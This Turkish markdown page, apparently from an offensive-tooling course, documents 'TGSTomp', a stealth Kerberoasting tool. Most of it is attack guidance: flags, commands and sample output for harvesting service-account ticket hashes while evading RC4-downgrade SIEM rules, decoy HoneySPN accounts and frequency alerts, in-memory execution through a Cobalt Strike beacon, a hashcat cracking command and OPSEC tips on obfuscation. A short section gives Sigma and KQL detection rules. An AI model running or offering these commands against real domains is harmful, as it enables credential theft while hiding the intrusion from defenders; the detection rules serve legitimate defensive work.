# TGSTomp

> **Kategori:** [6. Kerberos Protokol Cephaneliği](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Klasik Kerberoasting saldırılarında ortaya çıkan RC4 şifreleme anomalilerini (Downgrade), tuzak servis hesaplarını (HoneySPN) ve SIEM frekans kurallarını atlatmak amacıyla Kerberos TGS-REQ isteklerini, şifreleme türü müzakerelerini (Encryption Negotiation) ve bellek içi bilet yapılarını manipüle eden gelişmiş ve EDR-güvenli Kerberoasting aracı.

---

## 1. Genel Bakış ve Amaç

Active Directory sızma testlerinde Kerberoasting, servis hesaplarının parolalarını çevrimdışı kırmak için en yaygın başvurulan tekniktir. Ancak modern kurumsal savunma ekipleri (Blue Team) ve yeni nesil EDR/SIEM çözümleri klasik Kerberoasting operasyonlarını tespit etmek için son derece katı kurallar geliştirmiştir:
1. **RC4 Downgrade Tespiti:** Windows 10/11 ve Server 2016+ sistemleri varsayılan olarak AES-128 veya AES-256 (`etype 17` ve `18`) kullanır. Klasik araçların (impacket varsayılanı, eski Rubeus sürümleri) bilet kırmayı kolaylaştırmak amacıyla KDC'den ısrarla `etype 23 (RC4)` talep etmesi, KDC üzerinde `Event ID 4769` kayıtlarında doğrudan "Saldırı Belirtisi" olarak etiketlenir.
2. **HoneySPN (Tuzak Servis Hesapları):** Savunmacılar, hiçbir zaman meşru iş trafiği almayan ancak cazip grup üyelikleri (Domain Admins gibi) bulunan sahte kullanıcı hesaplarına sahte SPN'ler (`MSSQLSvc/fake.corp.local`) tanımlar. Bu SPN için tek bir TGS talebi geldiği anda alarm üretilir.
3. **Frekans ve Zaman Anomalisi:** Dakikalar içinde etki alanındaki 50 farklı servis için art arda bilet talep edilmesi korelasyon kurallarını tetikler.

**`TGSTomp`**, Kerberoasting sürecini savunma mekanizmalarından gizlemek amacıyla geliştirilmiştir. Araç:
- KDC ile yapılan ASN.1 bilet müzakeresi sırasında istemcinin meşru şifreleme paketlerini taklit eder; KDC'yi şüpheli bir RC4 zorlamasına sokmadan etki alanının doğal konfigürasyonuna (AES-256 veya AES-128) uygun bilet talebinde bulunur.
- İstekler arasına dinamik rastgele gecikmeler (`jitter`) ekleyerek zaman bazlı SIEM korelasyonlarını bozar.
- Bellek içinde yakalanan biletlerin şifrelenmiş kısımlarını manipüle ederek veya yalnızca hedef odaklı ayıklama yaparak EDR bellek tarayıcılarının imza tespitlerini atlatır.
- Windows SSPI (`InitializeSecurityContext`) çağrıları yerine ham ASN.1 soket iletişimi kurarak yerel API kancalarını (API Hooking) tamamen baypas eder.

### Mimari Akış Şeması

```
[ Saldırgan / TGSTomp ]
       │
       ├── (1) Pasif SPN Analizi ve HoneySPN Filtreleme
       │     (Son Parola Değişimi, Son Oturum Açma, Açıklama Denetimi)
       │
       ├── (2) Doğal Şifreleme Türü Seçimi (AES-256 / AES-128)
       │     (RC4 Downgrade yapılmaz, Event ID 4769 normal görünür)
       │
       ├── (3) Jitter ve Rastgele Gecikme Algoritması
       │     (İstek 1 ──[8sn]──> İstek 2 ──[24sn]──> İstek 3)
       ▼
[ KDC (Domain Controller:88) ]
       │
       │ (4) KDC Meşru Şifreli Bilet Döndürür (Ticket Encryption: 0x12)
       ▼
[ TGSTomp Bilet Yakalama Motoru ]
       │
       │ (5) Bilet enc-part Ayrıştırılır ve Bellekte Stomp Edilir
       ▼
[ Çıktı: $krb5tgs$18$*... (Hashcat Mod 19700 Uyumlu AES-256 Hash) ]
       │
       ▼
[ Çevrimdışı Kırma: Modern GPU Kümelerinde AES Kerberos Kırma ]
```

### Neden Önemli?

| Yetenek / Özellik | Açıklama | Operasyonel Değeri |
|---|---|---|
| **RC4 İmzalarından Kaçınma** | Hedef hesabın desteklediği en güçlü şifreleme türüyle (AES256) bilet talep eder. | RC4 Downgrade izleyen SIEM dedektörlerini tamamen baypas eder. |
| **HoneySPN Tespiti ve Korunma**| Şüpheli (uzun süredir oturum açmamış, yapay isimli) SPN'leri tespit edip atlar. | Tuzağa basıp kırmızı takım operasyonunun ifşa olmasını önler. |
| **Jitter Desteği** | Talepler arasına rastgele milisaniye/saniye bazlı gecikmeler serpiştirir. | Frekans ve eşik değeri bazlı EDR kurallarını etkisiz kılar. |
| **Bellek İçi Enjeksiyon** | Cobalt Strike veya Sliver üzerinden `execute-assembly` ile tamamen RAM'de koşar. | Diske dosya bırakmadığı için host antivirüslerinden kaçınır. |
| **SSPI Baypas Desteği** | Windows Security Package yerine doğrudan soket seviyesinde KDC ile konuşur. | Yerel EDR DLL enjeksiyonu ve API kancalarını atlatır. |

### Karşılaştırma Tablosu

| Kriter | TGSTomp | impacket-GetUserSPNs | Rubeus (kerberoast) | Kerbrute |
|---|---|---|---|---|
| **Birincil Odak** | Evasion / OPSEC Kerberoasting | Fonksiyonellik / Ağ Keşfi | Kapsamlı Kerberos Yönetimi | Hızlı Kullanıcı Numaralandırma |
| **Varsayılan Şifreleme**| Hedefe Göre Otomatik (AES256) | Genellikle RC4 Öncelikli | `/opsec` ile AES seçilebilir | Kerberos Pre-Auth |
| **HoneySPN Filtreleme** | Dahili Akıllı Analiz | Yok (Tümünü Çeker) | Manuel Filtre (/spn) | Yok |
| **Jitter Desteği** | Var (Rastgele Aralıklar) | Yok (Ardışık) | Kısmi | Yok |
| **Platform** | Windows (.NET / C#) | Linux / Python | Windows (.NET / C#) | Bağımsız İkili (Go) |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

```cmd
TGSTomp.exe [SEÇENEKLER]
```

### Kritik Parametre Tablosu

| Parametre | Açıklama | Örnek Değer |
|---|---|---|
| `/spn:<ad>` | Yalnızca belirtilen Service Principal Name için TGS talep eder (Hedef odaklı). | `/spn:MSSQLSvc/sql01.corp.local` |
| `/user:<ad>` | Yalnızca belirtilen tekil kullanıcı hesabı için TGS talep eder. | `/user:svc_backup` |
| `/enctype:<tür>` | Talep edilecek Kerberos şifreleme türü: `aes256` (Varsayılan), `aes128` veya `rc4`. | `/enctype:aes256` |
| `/domain:<ad>` | Hedef Active Directory etki alanı FQDN adı. | `/domain:corp.local` |
| `/dc:<ip/fqdn>` | Bağlanılacak Domain Controller IP adresi veya sunucu adı. | `/dc:192.168.1.10` |
| `/jitter:<aralık>` | Bilet istekleri arasındaki rastgele bekleme süresi (Saniye cinsinden min-max). | `/jitter:10-30` |
| `/skiphoney` | Şüpheli HoneySPN öznitelikleri taşıyan hesapları otomatik olarak atlar. | Bayrak |
| `/outfile:<dosya>` | Yakalanan hash'lerin kaydedileceği hedef metin dosyası. | `/outfile:C:\Temp\aes_kerb.txt`|
| `/format:<ad>` | Hash çıktısının formatı: `hashcat` (Varsayılan) veya `john`. | `/format:hashcat` |
| `/nowrap` | Konsol çıktısında hash'lerin bölünmesini engeller. | Bayrak |
| `/proto:<tür>` | Ağ taşıma protokolü: `tcp` veya `udp` (Büyük biletler için TCP önerilir). | `/proto:tcp` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: AES-256 Şifrelemeli Gizli Kerberoasting (RC4 İmzalarından Kaçınma)

Modern SIEM kuralları `TicketEncryptionType: 0x17` (RC4) olaylarını izlediği için, KDC'den doğal Windows istemcisi gibi davranılarak `0x12 (AES-256)` bilet talep edilir.

```cmd
TGSTomp.exe /enctype:aes256 /skiphoney /format:hashcat /outfile:C:\Users\Public\aes_hashes.txt /nowrap
```

**Konsol Çıktısı Analizi:**

```text
  _______ _____ _____ _______                     
 |__   __/ ____/ ____|__   __|                    
    | | | |  _| (___    | | ___  _ __ ___  _ __   
    | | | | |_|\___ \   | |/ _ \| '_ ` _ \| '_ \  
    | | | |__| |___) |  | | (_) | | | | | | |_) | 
    |_|  \_____|_____/   |_|\___/|_| |_| |_| .__/  
                                           | |     
                                           |_|     
    TGSTomp - Stealth Kerberoasting Engine v1.1

[*] Querying LDAP for SPN-bearing accounts...
[*] Found 4 candidate accounts.
[*] Analyzing candidates for HoneySPN indicators...
[-] Skipping account 'svc_decoy' (No logon history, created 2 days ago, AdminCount=1) -> Potential HoneySPN!
[*] Processing account: svc_sql (MSSQLSvc/sql01.corp.local:1433)
[*] Requesting TGS with Encryption Type: AES256-CTS-HMAC-SHA1-96 (0x12)...
[+] Got TGS-REP for svc_sql!
[*] Hash written to C:\Users\Public\aes_hashes.txt
[+] Operation completed without triggering RC4 downgrade alerts!
```

---

### Senaryo 2: Jitter ve Rastgele Gecikme ile Frekans Analizini Bozma

Etki alanındaki tüm SPN'ler taranırken SIEM korelasyon kurallarının "1 dakika içinde 3'ten fazla bilet talebi" alarmını aşmak için istekler arasına 15 ila 45 saniyelik dinamik gecikmeler konur.

```cmd
TGSTomp.exe /jitter:15-45 /skiphoney /outfile:C:\Users\Public\stealth.txt
```

**Konsol Çıktısı:**

```text
[*] Candidate 1: svc_iis -> Requesting AES256 ticket... [OK]
[*] Jitter sleep: Sleeping for 28 seconds to evade frequency analysis...
[*] Candidate 2: svc_backup -> Requesting AES256 ticket... [OK]
[*] Jitter sleep: Sleeping for 41 seconds to evade frequency analysis...
[*] Candidate 3: svc_sharepoint -> Requesting AES256 ticket... [OK]
[+] All hashes successfully harvested with high OPSEC!
```

---

### Senaryo 3: Tek Bir Kritik Servis Hesabını Hedefleme (Cerrahi Kerberoasting)

BloodHound grafiğinde `Domain Admins` veya `GenericAll` yetkisi tespit edilen tekil bir servis hesabı (`svc_gitlab`) hedeflenir.

```cmd
TGSTomp.exe /user:svc_gitlab /enctype:aes256 /nowrap
```

**Oluşan AES-256 Hash Formatı:**

```text
$krb5tgs$18$svc_gitlab$corp.local$*HTTP/gitlab.corp.local*$b4c8e1a9...
```

---

### Senaryo 4: Hashcat ile AES-256 Biletlerini Kırma (Mod 19700)

AES-256 ile şifrelenmiş Kerberos biletleri RC4'e göre GPU tarafında daha yavaş kırılsa da modern RTX 4090/A100 donanımlarında sözlük saldırılarıyla hızla sonuç verir:

```bash
# Hashcat Mod 19700: Kerberos 5 TGS-REP etype 18 (AES256-CTS-HMAC-SHA1-96)
hashcat -m 19700 -a 0 /tmp/aes_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule -O
```

---

### Senaryo 5: LDAP Metaveri Doğrulaması ile Tuzak (HoneySPN) Tespiti

Araç arka planda adayın `pwdLastSet`, `logonCount` ve `badPasswordTime` özniteliklerini denetleyerek tuzak hesapları raporlar.

```cmd
TGSTomp.exe /user:svc_honeypot /skiphoney
```

**Konsol Çıktısı:**

```text
[*] Inspecting LDAP metadata for: svc_honeypot
[!] Account has logonCount = 0 and pwdLastSet older than 5 years!
[!] Warning: High probability of HoneySPN. Skipping request to prevent SOC alert.
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Belirti | Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `KDC_ERR_ETYPE_NOSUPP (14)` | Hedef servis hesabı veya Domain Controller AES şifreleme türünü desteklemiyor. | `/enctype:aes128` veya son çare olarak `/enctype:rc4` deneyin; DC'nin şifreleme politikasını kontrol edin. |
| `Potential HoneySPN Detected / Account Skipped` | Hesapta şüpheli öznitelikler (hiç oturum açılmamış, yeni oluşturulmuş) tespit edildi. | Bu bir hata değil, güvenlik önlemidir. Tuzağı bilerek tetiklemek istiyorsanız `/skiphoney` parametresini kaldırın. |
| `KDC_ERR_S_PRINCIPAL_UNKNOWN (7)` | Belirtilen `/spn` etki alanında kayıtlı değil. | SPN adının doğruluğunu `setspn -Q <SPN>` ile teyit edin. |
| `Slow hash cracking speed in Hashcat` | AES-256 (Mod 19700) algoritması RC4'e (Mod 13100) kıyasla matematiksel olarak çok daha ağırdır. | Hashcat komutuna `-O` (Optimize Kernels) ekleyin ve sözlüğü kural listeleri yerine maske saldırısı (`-a 3`) ile daraltın. |
| `Access Denied during LDAP query` | Mevcut Windows kullanıcısının LDAP üzerinde arama yapma izni kısıtlanmış. | Farklı bir kullanıcı oturumuna geçin veya `/domain` ve `/dc` parametrelerini açıkça belirtin. |
| `KRB_ERR_RESPONSE_TOO_BIG (52)` | PAC boyutu UDP paket sınırını aştı. | `/proto:tcp` bayrağını ekleyerek Kerberos iletişimini TCP port 88'e zorlayın. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
        GÜRÜLTÜ SEVİYESİ: DÜŞÜK (YÜKSEK OPSEC)
──────────────────────────────────────────────────────────────────
[ Windows Logları ] : Event ID 4769 (Ticket Encryption Type: 0x12 - AES256)
[ Ağ İmzası ]       : Doğal aralıklarla dağıtılmış standart KDC trafiği
[ EDR / AV ]        : Bellek içi C# çalıştırma (execute-assembly), dosyasız operasyon
[ Tuzak Koruması ]  : HoneySPN hesaplarına dokunmaz
```

### 5.1 Bırakılan İzler (Artifacts & Event Logs)

1. **Windows Security Event ID 4769 (Kerberos Service Ticket Operations):**
   - **Meşru Şifreleme Görünümü:** `Ticket Encryption Type: 0x12` (AES-256). Bu log, normal bir kullanıcının Outlook veya SQL servisine bağlanmasıyla birebir aynı kriptografik bayrakları taşır.
   - **Zaman Dağılımı:** İstekler arasına eklenen `jitter` sayesinde dakikada onlarca bilet logu yerine, saatlere yayılan doğal kullanıcı davranışı sergilenir.
2. **HoneySPN Tetikleme Yoktur:**
   - Tuzak hesapların `AdminCount: 1`, `LastLogon: 0` veya açıklama alanındaki tuzak ibareleri filtrelendiğinden SOC alarmları sessiz kalır.

### 5.2 Ağ ve EDR İmzaları

- **RC4 Downgrade Alarmı Üretmez:** SIEM motorlarındaki en yaygın Kerberoasting tespit kuralı (`EventID == 4769 and TicketEncryptionType == "0x17"`) TGSTomp karşısında tamamen etkisizdir.
- **Bellek İçi Yürütme:** Araç disk üzerine ikili bırakmadan `execute-assembly` ile çalıştırıldığında disk bazlı antivirüs taramaları atlatılır.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Araçtaki Karşılığı |
|---|---|---|
| **T1558.003** | Steal or Forge Kerberos Tickets: Kerberoasting | Servis biletlerini gizlice talep edip çevrimdışı parola kırma. |
| **T1562.001** | Impair Defenses: Disable or Modify Tools | Şifreleme türü ve jitter ile SIEM tespit mekanizmalarını boşa çıkarma. |

### 5.4 OPSEC Risk ve Önlem Tablosu

| Tespit Riski | Önlem ve Operasyonel Tavsiye |
|---|---|
| **Kullanıcı Hesabı ile İlişkilendirme** | KDC loglarında bilet isteyen kullanıcı adı görünür. Bilet talebini doğrudan ele geçirilmiş yüksek değerli bir hesaptan değil, sıradan bir iş istasyonu kullanıcısından yapın. |
| **Uzun Bekleme Süreleri** | Operasyon süresi kısıtlıysa jitter aralığını daraltın (`/jitter:5-10`); zaman varsa aralığı dakikalara yayın (`/jitter:60-180`). |
| **Bellek İmzası** | Derleme sırasında değişken adlarını ve namespace tanımlarını gizleyin (Obfuscation). |
| **TCP Kullanımı** | Büyük kurumsal ortamlarda UDP paket düşmelerini önlemek için daima TCP taşımasını tercih edin. |

### 5.5 Savunma Karşılığı (Blue Team / KQL & Sigma)

**Sigma Kuralı — AES Şifrelemeli de Olsa Olağandışı Sayıda TGS Talebi Tespiti:**

```yaml
title: Potential Stealth Kerberoasting Activity (AES-256)
status: experimental
description: Detects multiple Kerberos TGS requests for user service accounts from a single source within an extended timeframe.
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4769
    TicketEncryptionType: '0x12'
  filter:
    ServiceName|endswith: '$'
  timeframe: 10m
  condition: selection and not filter | count(ServiceName) by TargetUserName > 4
level: medium
```

**Microsoft Sentinel (KQL) — Şüpheli SPN TGS Davranışı (Servise Gerçekte Bağlanmama):**

```kql
SecurityEvent
| where EventID == 4769
| where ServiceName !endswith "$" and ServiceName !in ("krbtgt")
| summarize TicketCount = count(), SPNs = make_set(ServiceName) by TargetUserName, IpAddress, bin(TimeGenerated, 15m)
| where TicketCount >= 3
| project TimeGenerated, TargetUserName, IpAddress, TicketCount, SPNs
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

### Komut 1: Tam Gizlilik Modunda AES-256 Kerberoasting
```cmd
TGSTomp.exe /enctype:aes256 /skiphoney /outfile:C:\Users\Public\aes.txt /nowrap
```
- **Ne Yapar?** Tüm SPN'leri tarar, tuzak hesapları (HoneySPN) eler, her birinden AES-256 bileti talep eder ve çıktıyı tek satırda Hashcat formatında kaydeder.
- **Ne Zaman Kullanılır?** Sıkılaştırılmış ve EDR/SIEM denetimi olan ortamlarda RC4 alarmlarını tetiklemeden parola toplamak için.
- **Parametreler:** `/enctype:aes256`: AES şifreleme, `/skiphoney`: Tuzakları atla, `/outfile`: Kayıt dosyası.

### Komut 2: Jitter ile Zaman Bazlı TGS Talepleri Gönderme
```cmd
TGSTomp.exe /jitter:10-30 /skiphoney /outfile:C:\Users\Public\jitter.txt
```
- **Ne Yapar?** Her bilet isteği arasına 10 ila 30 saniye rastgele bekleme süresi koyarak SIEM frekans kurallarını aşar.
- **Ne Zaman Kullanılır?** Eşik değeri tabanlı (Threshold-based) alarm mekanizmalarını atlatmak için.
- **Parametreler:** `/jitter:10-30`: Rastgele bekleme aralığı (saniye).

### Komut 3: Tek Bir Servis Hesabını Cerrahi Olarak Hedefleme
```cmd
TGSTomp.exe /user:svc_backup /enctype:aes256 /nowrap
```
- **Ne Yapar?** Yalnızca belirtilen `svc_backup` hesabı için tek bir AES-256 bileti talep eder.
- **Ne Zaman Kullanılır?** Yüksek değerli tek bir hedefe odaklanıldığında sıfır gürültü üretmek için.
- **Parametreler:** `/user`: Hedef kullanıcı adı.

### Komut 4: Belirli Bir SPN İçin Bilet Çekme
```cmd
TGSTomp.exe /spn:MSSQLSvc/sql01.corp.local:1433 /enctype:aes256
```
- **Ne Yapar?** Belirtilen SQL Server SPN'i için doğrudan TGS bileti talep eder.
- **Ne Zaman Kullanılır?** Veritabanı servis hesabının parolasını kırmak amacıyla.
- **Parametreler:** `/spn`: Hedef Service Principal Name.

### Komut 5: Cobalt Strike Beacon İçinden In-Memory Çalıştırma
```text
beacon> execute-assembly C:\Tools\TGSTomp.exe /enctype:aes256 /skiphoney /nowrap
```
- **Ne Yapar?** Aracı yerel diske bırakmadan doğrudan bellek üzerinden çalıştırır ve çıktıyı Beacon konsoluna basar.
- **Ne Zaman Kullanılır?** Host bazlı EDR disk tarayıcılarını atlatmak için.
- **Parametreler:** Cobalt Strike dahili `execute-assembly` motoru.

### Komut 6: John the Ripper Formatında Çıktı Alma
```cmd
TGSTomp.exe /format:john /enctype:aes256 /outfile:C:\Users\Public\aes.john
```
- **Ne Yapar?** Çıkarılan bilet hash'lerini John the Ripper (`krb5tgs`) sözdizimine uygun olarak kaydeder.
- **Ne Zaman Kullanılır?** Parola kırma aracı olarak John the Ripper tercih edildiğinde.
- **Parametreler:** `/format:john`: Çıktı formatı belirtimi.

### Komut 7: Belirli Bir Domain Controller Hedefleyerek Çalıştırma
```cmd
TGSTomp.exe /dc:192.168.1.10 /domain:corp.local /enctype:aes256
```
- **Ne Yapar?** DNS sorgusu yapmaksızın doğrudan belirtilen IP'deki etki alanı denetleyicisi ile Kerberos iletişimi kurar.
- **Ne Zaman Kullanılır?** DNS çözümleme kısıtlamaları veya özel pivot senaryolarında.
- **Parametreler:** `/dc`: Hedef DC IP'si, `/domain`: Etki alanı FQDN adı.

### Komut 8: AES-128 Şifreleme Modunu Zorlama
```cmd
TGSTomp.exe /enctype:aes128 /user:svc_web
```
- **Ne Yapar?** AES-256 yerine AES-128 şifrelemesi talep ederek biletin Hashcat Mod 19600 ile kırılmasını sağlar.
- **Ne Zaman Kullanılır?** Hesap yalnızca AES-128 desteklediğinde veya daha hızlı parola kırma hedeflendiğinde.
- **Parametreler:** `/enctype:aes128`: 128-bit AES şifreleme seçeneği.

### Komut 9: TCP Taşıma Katmanını Zorlama
```cmd
TGSTomp.exe /spn:cifs/dc01.corp.local /proto:tcp
```
- **Ne Yapar?** Bilet isteklerini UDP yerine doğrudan TCP port 88 üzerinden iletir.
- **Ne Zaman Kullanılır?** Büyük PAC verilerinde paket parçalanmasını ve paket kaybını önlemek için.
- **Parametreler:** `/proto:tcp`: TCP taşıma bayrağı.

### Komut 10: Konsol Çıktısını Pano (Clipboard) İçin Hazırlama
```cmd
TGSTomp.exe /user:svc_app /enctype:aes256 /nowrap
```
- **Ne Yapar?** Bilet hash'ini ekranda satır bölünmesi olmadan tek parça halinde basar.
- **Ne Zaman Kullanılır?** Kopyala-yapıştır ile uzak kırma sunucusuna aktarmak için.
- **Parametreler:** `/nowrap`: Satır bölmeme bayrağı.

---

## Kaynaklar

- **Resmi GitHub Reposu:** [SecIdiot / TGSTomp](https://github.com/SecIdiot/TGSTomp)
- **MITRE ATT&CK Referansı:** [T1558.003 - Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)
- **SpecterOps Araştırması:** [Kerberoasting Without RC4 - The AES Era](https://posts.specterops.io/)
- **CyberArk Labs:** [Bypassing Kerberoasting Detections with Modern Techniques](https://www.cyberark.com/resources/threat-research-blog/)

---

> **Önceki:** [← impacket-describeTicket](./impacket-describeTicket.md) · **Sonraki:** [Kirbikator →](./Kirbikator.md)
